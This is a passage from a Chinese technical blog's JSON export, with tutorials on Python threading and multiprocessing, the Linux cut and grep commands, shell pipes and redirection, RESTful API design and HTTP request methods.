获得锁的线程用完后一定要释放锁，否则那些苦苦等待锁的线程将永远等待下去，成为死线程。所以我们用try...finally来确保锁一定会被释放。 锁的好处就是确保了某段关键代码只能由一个线程从头到尾完整地执行，坏处当然也很多，首先是阻止了多线程并发执行，包含锁的某段代码实际上只能以单线程模式执行，效率就大大地下降了。其次，由于可以存在多个锁，不同的线程持有不同的锁，并试图获取对方持有的锁时，可能会造成死锁，导致多个线程全部挂起，既不能执行，也无法结束，只能靠操作系统强制终止。 Reference 多线程 - https://www.liaoxuefeng.com/wiki/1016959663602400/1017629247922688","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】线程 - 多线程（Multithreading）","date":"2019-09-23T13:17:49.000Z","path":"2019/09/23/【Python】线程-多线程/","text":"Python 多线程Python中使用线程有两种方式：函数或者用类来包装线程对象。 函数 - 创建新线程1thread.start_new_thread ( function, args[, kwargs] ) 参数说明: function - 线程函数。 args - 传递给线程函数的参数,他必须是个tuple类型。 kwargs - 可选参数。 1234567891011121314151617181920212223#!/usr/bin/python# -*- coding: UTF-8 -*- import threadimport time # 为线程定义一个函数def print_time( threadName, delay): count = 0 while count &lt; 5: time.sleep(delay) count += 1 print \"%s: %s\" % ( threadName, time.ctime(time.time()) ) # 创建两个线程try: thread.start_new_thread( print_time, (\"Thread-1\", 2, ) ) thread.start_new_thread( print_time, (\"Thread-2\", 4, ) )except: print \"Error: unable to start thread\" while 1: pass 包装线程对象 - 创建线程Python 提供了Thread类来处理线程，Thread类提供了以下方法: run()： 用以表示线程活动的方法。 start()：启动线程活动。 join([time]) ：等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。 isAlive()：返回线程是否活动的。 getName()：返回线程名。 setName() ：设置线程名。 使用Threading模块创建线程，直接从threading.Thread类继承，然后重写init方法和run方法： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python# -*- coding: UTF-8 -*- import threadingimport time exitFlag = 0 class myThread (threading.Thread): #继承父类threading.Thread def __init__(self, threadID, name, counter): threading.Thread.__init__(self) self.threadID = threadID self.name = name self.counter = counter def run(self): #把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 print \"Starting \" + self.name print_time(self.name, self.counter, 5) print \"Exiting \" + self.name def print_time(threadName, delay, counter): while counter: if exitFlag: (threading.Thread).exit() time.sleep(delay) print \"%s: %s\" % (threadName, time.ctime(time.time())) counter -= 1 # 创建新线程thread1 = myThread(1, \"Thread-1\", 1)thread2 = myThread(2, \"Thread-2\", 2) # 开启线程thread1.start()thread2.start() print \"Exiting Main Thread\" 或者，把一个函数传入并创建Thread实例，然后调用start()开始执行： 1234567891011121314151617import time, threading# 新线程执行的代码:def loop(): print('thread %s is running...' % threading.current_thread().name) n = 0 while n &lt; 5: n = n + 1 print('thread %s &gt;&gt;&gt; %s' % (threading.current_thread().name, n)) time.sleep(1) print('thread %s ended.' % threading.current_thread().name)print('thread %s is running...' % threading.current_thread().name)t = threading.Thread(target=loop, name='LoopThread')t.start()t.join()print('thread %s ended.' % threading.current_thread().name)","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】线程 - 多进程","date":"2019-09-23T09:22:48.000Z","path":"2019/09/23/【Python】线程-多进程/","text":"BackgroundUnix/Linux操作系统提供了一个fork()系统调用，它非常特殊。 对普通函数的调用，调用一次，返回一次。 但是，调用fork()一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。 子进程永远返回0，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用getppid()就可以拿到父进程的ID。 Python的os模块封装了常见的系统调用，其中就包括fork，可以在Python程序中轻松创建子进程： 123456789import osprint('Process (%s) start...' % os.getpid())# Only works on Unix/Linux/Mac:pid = os.fork()if pid == 0: print('I am child process (%s) and my parent is %s.' % (os.getpid(), os.getppid()))else: print('I (%s) just created a child process (%s).' % (os.getpid(), pid)) 运行结果如下： 123Process (876) start...I (876) just created a child process (877).I am child process (877) and my parent is 876. 由于Windows没有fork调用，上面的代码在Windows上无法运行。而Mac系统是基于BSD（Unix的一种）内核，所以，在Mac下运行是没有问题的，推荐大家用Mac学Python！ 有了fork调用，一个进程在接到新任务时就可以复制出一个子进程来处理新任务，常见的Apache服务器就是由父进程监听端口，每当有新的http请求时，就fork出子进程来处理新的http请求。 multiprocessingmultiprocessing模块提供了一个Process类来代表一个进程对象，下面的例子演示了启动一个子进程并等待其结束： 1234567891011121314from multiprocessing import Processimport os# 子进程要执行的代码def run_proc(name): print('Run child process %s (%s)...' % (name, os.getpid()))if __name__=='__main__': print('Parent process %s.' % os.getpid()) p = Process(target=run_proc, args=('test',)) print('Child process will start.') p.start() p.join() print('Child process end.') 执行结果如下： 1234Parent process 928.Process will start.Run child process test (929)...Process end. 创建子进程时，只需要传入一个执行函数和函数的参数，创建一个Process实例，用start()方法启动，这样创建进程比fork()还要简单。 join()方法可以等待子进程结束后再继续往下运行，通常用于进程间的同步。 进程池 - Pool如果要启动大量的子进程，可以用进程池的方式批量创建子进程： 12345678910111213141516171819from multiprocessing import Poolimport os, time, randomdef long_time_task(name): print('Run task %s (%s)...' % (name, os.getpid())) start = time.time() time.sleep(random.random() * 3) end = time.time() print('Task %s runs %0.2f seconds.' % (name, (end - start)))if __name__=='__main__': print('Parent process %s.' % os.getpid()) p = Pool(4) for i in range(5): p.apply_async(long_time_task, args=(i,)) print('Waiting for all subprocesses done...') p.close() p.join() print('All subprocesses done.') 执行结果如下： 12345678910111213Parent process 669.Waiting for all subprocesses done...Run task 0 (671)...Run task 1 (672)...Run task 2 (673)...Run task 3 (674)...Task 2 runs 0.14 seconds.Run task 4 (673)...Task 1 runs 0.27 seconds.Task 3 runs 0.86 seconds.Task 0 runs 1.41 seconds.Task 4 runs 1.91 seconds.All subprocesses done. 代码解读： 对Pool对象调用join()方法会等待所有子进程执行完毕，调用join()之前必须先调用close()，调用close()之后就不能继续添加新的Process了。 请注意输出的结果，task 0，1，2，3是立刻执行的，而task 4要等待前面某个task完成后才执行，这是因为Pool的默认大小在我的电脑上是4，因此，最多同时执行4个进程。这是Pool有意设计的限制，并不是操作系统的限制。如果改成： 1p = Pool(5) 就可以同时跑5个进程。 由于Pool的默认大小是CPU的核数，如果你不幸拥有8核CPU，你要提交至少9个子进程才能看到上面的等待效果。 启动外部进程subprocess模块可以让我们非常方便地启动一个子进程，然后控制其输入和输出。 下面的例子演示了如何在Python代码中运行命令nslookup www.python.org，这和命令行直接运行的效果是一样的： 12345import subprocessprint('$ nslookup www.python.org')r = subprocess.call(['nslookup', 'www.python.org'])print('Exit code:', r) 运行结果： 12345678910$ nslookup www.python.orgServer: 192.168.19.4Address: 192.168.19.4#53Non-authoritative answer:www.python.org canonical name = python.map.fastly.net.Name: python.map.fastly.netAddress: 199.27.79.223Exit code: 0 如果子进程还需要输入，则可以通过communicate()方法输入： 1234567import subprocessprint('$ nslookup')p = subprocess.Popen(['nslookup'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)output, err = p.communicate(b'set q=mx\\npython.org\\nexit\\n')print(output.decode('utf-8'))print('Exit code:', p.returncode) 上面的代码相当于在命令行执行命令nslookup，然后手动输入： 123set q=mxpython.orgexit 运行结果如下： 12345678910111213$ nslookupServer: 192.168.19.4Address: 192.168.19.4#53Non-authoritative answer:python.org mail exchanger = 50 mail.python.org.Authoritative answers can be found from:mail.python.org internet address = 82.94.164.166mail.python.org has AAAA address 2001:888:2000:d::a6Exit code: 0 Reference 多线程 - https://www.liaoxuefeng.com/wiki/1016959663602400/1017628290184064","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Linux】命令 - cut命令","date":"2019-09-17T04:20:47.000Z","path":"2019/09/17/【Linux】命令-cut命令/","text":"cut命令cut 命令对指定文件的内容的每一行进行截断，并将截断后的所有内容（或部分内容）输出到标准输出。 123usage: cut -b list [-n] [file ...] cut -c list [file ...] cut -f list [-s] [-d delim] [file ...] 如果不指定 File，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。 参数: -b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。 -c ：以字符为单位进行分割。 -d ：自定义分隔符，默认为制表符。 -f ：与-d一起使用，指定显示哪个区域。 -n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的范围之内，该字符将被写出；否则，该字符将被排除 -b 参数 - 按字节分割注意：一个空格算一个字节，一个汉字算三个字节 12345678910111213141516$ date2011年08月11日 星期四20:44:52 EDT# 取前四个字节$ date |cut -b 1-4 2011$ date |cut -b 1-62011# 一个汉字算三个字节$ date |cut -b 1-7 2011年$ date |cut -b 1-102011年08 -c 参数 - 按字符分割按字符cut相对比较简单，中文字符和空格都算一个字符。 12345$ date |cut -c 1-52011年$ date |cut -c 5,9,13年月日 -d 和 -f 配合使用 - 指定列分隔符，按列分割其中，-d指定列分隔符，-f 指定要剪出哪几个列（以每行作为一个单元进行切割）， -d选项的默认间隔符就是制表符，所以当你就是要使用制表符的时候，就可以省略 -d 选项，而直接用 -f 来指定需要将哪一部分列输出到标准输出（通过提供域的序号，索引从1开始）： 12345678910111213141516$ cat 1data11 data12 data13data21 data22 data22data31 data32 data33# 输出每行的列 1 内容（分隔符为“ ”）$ cat 1 | cut -d \" \" -f 1data11data21data31# 输出每行的列 1 和列 2 的内容（分隔符为“ ”）cat 1 | cut -d \" \" -f 1,2data11 data12data21 data22data31 data32","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】Shell/Bash - 多命令执行、管道（pipeline）和重定向（redirection）","date":"2019-09-17T03:36:56.000Z","path":"2019/09/17/【Linux】Shell-管道和重定向/","text":"多命令之间无数据共享按顺序执行多个命令（无论命令是否执行成功） - ;1$ &lt;command 1&gt;; &lt;command 2&gt; 分号（;）是一个命令的结束符，使用分号可以在一行中执行多个命令，上一个命令执行结束后，再执行第二个命令。 注意，使用分号时，第二个命令总是接着第一个命令执行，不管第一个命令执行成功或失败。 123456$ echo \"--\";ll;echo \"---\"--total 16-rw-r--r--@ 1 weishi wheel 5B 17 Sep 11:00 1-rw-r--r--@ 1 weishi wheel 50B 17 Sep 11:08 2--- 1$ clear; ls 上面例子中，Bash 先执行 clear 命令，执行完成后，再执行 ls 命令。 逻辑与 - &amp;&amp;1$ &lt;command 1&gt; &amp;&amp; &lt;command 2&gt; 按顺序，当前面的命令执行发生错误时，后面的命令则不会被执行。 当后面的命令需要前面的命令正确执行做支持时(如环境搭建)，可以用这种方式免去等待输入。 逻辑或1$ &lt;command 1&gt; || &lt;command 2&gt; 按顺序，有命令执行正确时，后面的命令不会执行。 当一件事可以有多个命令相互代替，不确定哪个可以正确执行时，可以用这种方式免去等待输入。 启动一个新 shell 子进程执行命令 - &amp;对于一些程序，在它运行时，它会占用当前bash shell process（直到这个程序执行完）。 所有如果当这个程序执行非常耗时时，我们可能希望当它运行后，不要占用当前 shell process。 换句话说，将这个程序在后台运行（这意味着我们不能在当前 shell 中看到这个程序执行过程中的stderr和stdout）。 这时候，我们就可以使用&amp;（当然，我们通过传递特定参数，来让程序在自身内部实现以后台模式运行，也是OK的）。 123456$ time sleep 50sleep 5 0.00s user 0.00s system 0% cpu 50.008 total# 获取当前 shell process 的 PID$ echo $$$ time sleep 5&amp;[1] 18147 增加&amp;后，这行command在成功启动一个新的 shell child process （对应的 PID 为18147）后，就会返回执行流（这意味着，你可以继续输入命令，而不是当这个command执行结束后，才返回执行流）。 多命令之间有数据共享管道（pipeline） - |管道命令操作符是：”|”，它能且仅能获取由前面一个命令执行后输出的标准输出（standard output, stdout），而并不能获取前面一个命令执行后输出的标准错误信息（stdandard error, stderr）。然后，传递给下一个命令，作为它的标准输入（standard input, stdin）。 123456$ cat test.sh | grep -n 'echo' echo \"very good!\"; echo \"good!\"; echo \"pass!\"; echo \"no pass!\";#读出test.sh文件内容，通过管道转发给grep 作为输入内容 常用来作为接收数据管道命令有：sed,awk,cut,head,top,less,more,wc,join,sort,split 等等，都是些文本处理命令。 例子1$ netstat -an 可以查看所有的网络连接情况。 LISTEN表示端口被监听，等待被人访问。ESTABLISHED表示有人正在使用这个端口 也就是说只要有一个ESTABLISHED，就表明有一个客户端正连接在这个服务器上，因此可以用管道符去查找这些信息行： 12$ netstat -an | grep \"ESTABLISHED\"tcp 0 52 192.168.0.112:22 192.168.0.104:2367 ESTABLISHED 从而统计服务器上连接了哪些人。还可以将这个结果再接一个管道符，用 wc -l 去处理这个结果，就知道有多少行(人)连接了这个服务器，而不去关心其它信息了： 12$ netstat -an | grep \"ESTABLISHED\" | wc -l3 重定向（redirection） - &gt;/ &lt;重定向（redirection）可以指定将前一个命令执行所输出的标准流（包括标准输入、标准输出或标准错误输出）或者文件内容输出到特定位置。 &gt;：输出重定向，表示重定向标准输出或标准错误输出，即将一个命令的执行结果的标准输出（默认是标准输出，也可以指定为标准错误输出）重定向到哪里，例如 echo &quot;123&quot; &gt; /home/123.txt ，即执行 echo 命令，其会将 123 字符串输入到标准输出，&gt; 则会将 echo 执行结束的标准输出（通过标准输入）输出作为 123.txt 文件的内容（原内容会被覆盖掉）。 &lt;：输入重定向，表示将一个文件的内容作为标准输入重定向到一个命令中，比如，将一个文件的内容作为一个命令的标准输入 1 ：表示标准输出（stdout），重定向的默认值就是1，因此在 echo &quot;123&quot; &gt; /home/123.txt 中，会将 echo 执行结束的标准输出（通过标准输入）输出到文件中。 2 ：表示标准错误（stderr），比如我们希望将一个命令执行后输出的标准错误输出输出作为下一个命令的标准输入，就可以使用 &lt;command_1&gt; 2&gt; &lt;command_2&gt;。 &amp; ：表示等同于的意思，2&gt;&amp;1，表示2（即标准错误输出）的内容重定向等同于1（即标准输出）。换句话说，将标准错误输出的内容重定向到标准输出被重定向到的地方。 /dev/null ：代表空设备文件 &lt;command&gt; 1&gt;/dev/null 2&gt;&amp;1 语句含义，是 allow standard error to be redirected to the same destination that standard output is directed to，因为 1 &gt; /dev/null ： 首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，说白了就是在终端不显示任何信息（在执行完一个命令后）。 2&gt;&amp;1 ：同时，标准错误输出重定向（等同于）标准输出，因为之前已经指定标准输出重定向到空设备文件，所以标准错误输出也重定向到空设备文件。 Case 1 - [输出重定向] 只需要标准错误输出1234567$ echo \"sw test\" &gt; file1$ cat file1sw test$ echo \"sw test\" 2&gt; file1sw test$ cat file1$ 可以看到，当执行 echo &quot;sw test&quot; 2&gt; file1 后，file1中并没有内容，这是因为我们使用了 2&gt;，因此将 echo 命令的执行结果的标准错误重定向到 file1 文件中，而 echo 命令的执行结果的标准错误内容为空，因此，file1中并没有内容。 注意，这里的 2 和 &gt; 之间不可以有空格，*2&gt; *是一体的时候才表示重定向标准错误输出。 Case 2 - [输出重定向] 不需要标准错误输出或标准输出123456789101112131415$ echo \"sw test2\"sw test2# 执行完后，在 terminal 并没有任何输出，是因为我们把标准输出重定向到了空设备文件$ echo \"sw test2\" 1&gt;/dev/null$# 类似地，如果我们不需要标准错误输出wrongCommandzsh: command not found: wrongCommand$ wrongCommand 2&gt;/dev/null$# 如果我们标准错误输出和标准错误都不需要$ echo \"sw test2\" 1&gt;/dev/null 2&gt;&amp;1 Case 3 - 2&gt;&amp;1（将标准错误输出和标准输出同时记录到文件中）下面通过一个例子来展示2&gt;&amp;1有什么作用： 1234567891011121314151617181920$ cat test.shtdate# 如果不做任何重定向，terminal 会显示当前所有标准输出和标准错误输出$ ./test.sh./test.sh: line 1: t: command not foundSat May 30 15:38:55 +08 2020# 将标准输出重定向到 test1.log中（因此 terminal 中只显示标准错误输出）$ ./test.sh &gt; test1.log$ ./test.sh: line 1: t: command not found$ cat test1.logSat May 30 15:40:02 +08 2020$ ./test.sh &gt; test2.log 2&gt;&amp;1$ cat test2.log./test.sh: line 1: t: command not foundSat May 30 15:41:23 +08 2020 test.sh中包含两个命令，其中t是一个不存在的命令，因此执行会报错。默认情况下，标准错误输出会在terminal中显示（因为我们只将标准输出信息重定向到了 test1.log）。date 命令则能正确执行，因此输出时间信息到了标准输出。 而执行 ./test.sh &gt; test2.log 2&gt;&amp;1时，stderr和stdout的内容都被重定向到 test2.log 文件中了。 Case 4- 输入重定向12# 将hadoop-hadoop-jobtracker-brix-00.out的内容作为test.sh的输入$ sh test.sh &lt; hadoop-hadoop-jobtracker-brix-00.out 管道命令与重定向区别区别是： 输入输出 当使用管道时（ &lt;command_1&gt; | &lt;command_2&gt; ），左边的命令应该有标准输出，右边的命令应该能够接受标准输入（否则这个管道的使用并没有意义，因为不产生任何效果） 当使用向右重定向（&gt;）左边的命令应该有标准输出 &gt; 右边只能是文件（普通文件，文件描述符，文件设备） 左边的命令应该需要标准输入 &lt; 右边只能是文件 管道触发两个子进程执行”|”两边的程序；而重定向是在一个进程内执行 例子12345678910111213141516171819202122232425262728293031323334353637# 可以相互转换情况# 输入重定向$ cat test.sh | grep -n 'echo' echo \"very good!\"; echo \"good!\"; echo \"pass!\"; echo \"no pass!\";# \"|\"管道两边都必须是shell命令 $ grep -n 'echo' &lt; test.sh echo \"very good!\"; echo \"good!\"; echo \"pass!\"; echo \"no pass!\";# \"重定向\"符号，右边只能是文件（普通文件，文件描述符，文件设备）#上面一个等同于这个$ sed -n '1,$p' &lt; test.sh | grep -n 'echo' echo \"very good!\"; echo \"good!\"; echo \"pass!\"; echo \"no pass!\"; $ sed -n '1,10p' &lt; test.sh | grep -n 'echo' &lt;testsh.sh10:echo $total;18:echo $total;21: echo \"ok\";#哈哈，这个grep又接受管道输入，又有testsh.sh输入，那是不是2个都接收呢。刚才说了\"&lt;\"运算符会优先，管道还没有发送数据前，grep绑定了testsh.sh输入，这样sed命令输出就被抛弃了。这里一定要小心使用 #输出重定向$ cat test.sh&gt;test.txt$ cat test.sh|tee test.txt &amp;&gt;/dev/null#通过管道实现将结果存入文件,还需要借助命令tee，它会把管道过来标准输入写入文件test.txt ,然后将标准输入复制到标准输出(stdout),所以重定向到/dev/null 不显示输出#\"&gt;\"输出重定向，往往在命令最右边，接收左边命令的，输出结果，重定向到指定文件。也可以用到命令中间。 Reference https://en.wikipedia.org/wiki/Standard_streams 【Linux学习笔记】22：Bash基础-管道符”|” - https://blog.csdn.net/SHU15121856/article/details/77623988","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】命令 - grep 命令","date":"2019-09-16T13:43:16.000Z","path":"2019/09/16/【Linux】命令-grep命令/","text":"grepLinux系统中grep命令是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹 配的行打印出来。grep全称是Global Regular Expression Print，表示全局正则表达式版本，它的使用权限是所有用户。 Usage12345$ grepusage: grep [-abcDEFGHhIiJLlmnOoqRSsUVvwxZ] [-A num] [-B num] [-C[num]] [-e pattern] [-f file] [--binary-files=value] [--color=when] [--context[=num]] [--directories=action] [--label] [--line-buffered] [--null] [pattern] [file ...] 主要参数： -c：只输出匹配行的计数。 -I：不区分大小写(只适用于单字符)。 -h：查询多文件时不显示文件名。 -l：查询多文件时，只输出包含了匹配字符传的文件的文件名。 -n：显示匹配行及行号。 -s：不显示不存在或无匹配文本的错误信息。 -v：显示不包含匹配文本的所有行。 查找文件在多个文件中查询特定字符串1$ grep ‘test’ aa bb cc 输出在aa，bb，cc文件中匹配到 test 字符串的行。 在文件夹中查找存在特定字符串的文件比如，我们在当前子目录下，查找哪些文件中存在字符串”aa”： 12345$ grep aa ./*grep: ./assets: Is a directory./【刷题】LinkedList-Leetcode-138-Copy-List-with-Random-Pointer.md:![动画描述](assets/16a2de34a98aa550.gif)./【刷题】LinkedList-Leetcode-160-Intersection-of-Two-Linked-Lists.md:aa./【刷题】LinkedList-Leetcode-160-Intersection-of-Two-Linked-Lists.md:aa 默认情况下，grep 只搜索当前目录。如果此目录下有许多子目录，grep 会以如下形式列出： 1$ grep: ./assets: Is a directory 这可能会使 ‘grep 的输出难于阅读。这里有两种解决的办法： 搜索子目录：grep -r 或忽略子目录：grep -d skip 查找所有以d字符开头作为文件名的文件，且文件中包含 test 字符串1$ grep ‘test’ d* -l - 只列出包含匹配字符串的文件的文件名12$ grep -l \"assets/*.*\" ./*./2 -r - 搜索子目录1$ grep -r 'string' /etc 默认情况下，grep 只搜索当前目录。如果此目录下有许多子目录，grep 会以如下形式列出： 1$ grep: ./assets: Is a directory -h - 查询多文件时不显示文件名12$ grep -h \"assets/*.*\" ./*test1 ![img](assets/160_statement.png) test2 匹配定制-i - 不区分大小写地搜索 不区分大小写地搜索。默认情况区分大小写， 1$ grep -i pattern files -w - 只匹配整个单词只匹配整个单词（单词意味着这个字符串的两侧有分隔符），而不是字符串的一部分（如输入 magic，匹配 magic，而 magical 不能被匹配)， 1$ grep -w pattern files -F - 将输入模式视为一个普通字符串12 或匹配输出匹配 pattern1 或 pattern2 的行： 1$ grep pattern1 | pattern2 files 也可以： 输出包含 ed 或者 at 字符的行的内容 1$ cat test.txt | grep -E \"ed|at\" 与匹配显示既匹配 pattern1 又匹配 pattern2 的行内容。 1$ grep pattern1 files | grep pattern2 比如 1$ grep proctm log/data.log | grep ormstats 输出 log/data.log 文件中既包含 proctm 又包含 ormstats的行。 -v - 非匹配（匹配不包含特定字符串的所有行）1$ grep -v pattern1 files 比如我想查看apaceh日志中，非图片的浏览记录。可以使用以下命令： 1$ tail -f /usr/loca/apache/logs/access.log | grep -v '.jpg' 这条命令就可以针对apaceh的用户访问记录中，除了.jpg 图片之外的浏览日志，这样可以针对我们更好的分析日志了。 当然你可以再加 |grep -v &#39;.png&#39; 这样又可以排除 .png 格式的图片访问日志。 控制输出-o - 只输出匹配到的那个字符串部分如果不包含 -o（不包含 -o 为默认情况），则会把匹配到的那个部分所在的那一整行都输出到 terminal。 123456789$ cat ./filetest1 ![img](assets/160_statement.png) filetest3$ grep \"assets/*.*\" ./filetest1 ![img](assets/160_statement.png) file$ grep -o \"assets/*.*\" ./fileassets/160_statement.png) 而如果包含 -o 之后，只输出被匹配到的那部分字符串。 -n - 同时列出匹配字符串所在行的行号12$ grep -n \"assets/*.*\" ./file1:test1 ![img](assets/160_statement.png) test2 这里列出了行号为 1。 -c - 输出匹配上模式的行的数量比如，查找指定进程个数 1$ ps -ef | grep -c svn -m 1 - 只输出匹配上的第一个行（第二个行和后面的行都不输出，即使匹配上了）grep与正则表达式pattern正则表达式主要参数： \\： 忽略正则表达式中特殊字符的原有含义。 ^：匹配正则表达式的开始行。 $: 匹配正则表达式的结束行。 \\&lt;：从匹配正则表达式的行开始。 \\&gt;：到匹配正则表达式的行结束。 [&lt;candidate_character&gt;]：指定单个字符集合，如[A]表示只匹配字符 A 。 [&lt;candidate_character&gt;-&lt;candidate_character&gt;]：指定字符字符集合范围，如 [A-Z]，即匹配A、B、C…或 Z 。 .：匹配任意的单个字符。 *：匹配任何长度从0到无穷的字符串。 Case 1 - 输出存在字符集合中任何一个字符的行的内容输出包含任何小写字母的行 123456789$ cat size.txt | grep '[a-b]' b124230b034325a081016a022021a061048b103303a013386b044525 Case 2 - 不是特定字符开头12345# 输出行首既不是以4，也不是以8开头的所有行的内容$ grep '^[^48]' data.doc # 输出行首不是以 u 开头的所有行的内容cat test.txt |grep ^[^u] Case 3 - 输出以特定字符串结尾的行1$ cat test.txt | grep hat$","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【HTTP】RESTful","date":"2019-08-26T10:10:13.000Z","path":"2019/08/26/【HTTP】RESTful/","text":"RESTful架构如果一个架构符合REST原则，就称它为RESTful架构。 要理解RESTful架构，最好的方法就是去理解Representational State Transfer这个词组到底是什么意思，它的每一个词代表了什么涵义。如果你把这个名称搞懂了，也就不难体会REST是一种什么样的设计。 资源（Resources）REST的名称”表现层状态转化”中，省略了主语。”表现层”其实指的是”资源”（Resources）的”表现层”。 所谓”资源”，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。你可以用一个URI（统一资源定位符）指向它，每种资源对应一个特定的URI。要获取这个资源，访问它的URI就可以，因此URI就成了每一个资源的地址或独一无二的识别符。 所谓”上网”，就是与互联网上一系列的”资源”互动，调用它的URI。 表现层（Representation）“资源”是一种信息实体，它可以有多种外在表现形式。我们把”资源”具体呈现出来的形式，叫做它的”表现层”（Representation）。 比如，文本可以用txt格式表现，也可以用HTML格式、XML格式、JSON格式表现，甚至可以采用二进制格式；图片可以用JPG格式表现，也可以用PNG格式表现。 URI只代表资源的实体，不代表它的形式。严格地说，有些网址最后的”.html”后缀名是不必要的，因为这个后缀名表示格式，属于”表现层”范畴，而URI应该只代表”资源”的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对”表现层”的描述。 状态转化（State Transfer）访问一个网站，就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。 互联网通信协议HTTP协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端。因此，如果客户端想要操作服务器，必须通过某种手段，让服务器端发生”状态转化”（State Transfer）。而这种转化是建立在表现层之上的，所以就是”表现层状态转化”。 客户端用到的手段，只能是HTTP协议。具体来说，就是HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。 路径（Endpoint）在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的”集合”（collection），所以API中的名词也应该使用复数。 举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。 123https://api.example.com/v1/zooshttps://api.example.com/v1/animalshttps://api.example.com/v1/employees HTTP动词对于资源的具体操作类型，由HTTP动词表示。 常用的HTTP动词有下面五个（括号里是对应的SQL命令）。 GET（SELECT）：从服务器取出资源（一项或多项）。 POST（CREATE）：在服务器新建一个资源。 PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。 PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。 DELETE（DELETE）：从服务器删除资源。 还有两个不常用的HTTP动词： HEAD：获取资源的元数据。 OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。 下面是一些例子。 GET /zoos：列出所有动物园 POST /zoos：新建一个动物园 GET /zoos/ID：获取某个指定动物园的信息 PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息） PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息） DELETE /zoos/ID：删除某个动物园 GET /zoos/ID/animals：列出某个指定动物园的所有动物 DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物 过滤信息（Filtering）如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。 下面是一些常见的参数。 ?limit=10：指定返回记录的数量 ?offset=10：指定返回记录的开始位置。 ?page=2&amp;per_page=100：指定第几页，以及每页的记录数。 ?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。 ?animal_type_id=1：指定筛选条件 Reference RESTful API 设计指南 - http://www.ruanyifeng.com/blog/2014/05/restful_api.html 理解RESTful架构 - http://www.ruanyifeng.com/blog/2011/09/restful.html","comments":true,"categories":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/tags/HTTP/"}]},{"title":"【HTTP】HTTP 请求方法（Methods）","date":"2019-08-26T09:19:23.000Z","path":"2019/08/26/【HTTP】HTTP请求方法/","text":"GETGET方法请求一个指定资源的表示形式. 使用GET的请求应该只被用于获取数据. HEADHEAD方法请求一个与GET请求的响应相同的响应，但没有响应体（HTTP Body）. HEAD请求响应里HTTP头域里的元信息应该和GET请求响应里的元信息一致。此方法被用来获取请求实体的元信息而不需要传输实体主体（entity-body）。此方法经常被用来测试超文本链接的有效性，可访问性，和最近的改变。. HEAD请求的响应是可缓存的，因为响应里的信息可能被用于更新以前的那个资源的缓存实体.。如果出现一个新的域值指明了缓存实体和当前源服务器上实体的不同（可能因为Content-Length，Content-MD5，ETag或Last-Modified值的改变），那么缓存（cache）必须认为此缓存项是过时的（stale）。 POSTPOST 方法被用于请求源服务器接受请求中的实体作为请求资源的一个新的从属物。 PUTPUT方法请求服务器去把请求里的实体存储在请求URI（Request-URI）标识下。如果请求URI（Request-URI）指定的的资源已经在源服务器上存在，那么此请求里的实体应该被当作是源服务器此URI所指定资源实体的修改版本。 DELETEDELETE方法删除指定的资源。 CONNECTHTTP1.1协议规范保留了CONNECT方法，此方法是为了能用于能动态切换到隧道的代理服务器（proxy，译注：可以为代理，也可以是代理服务器）。 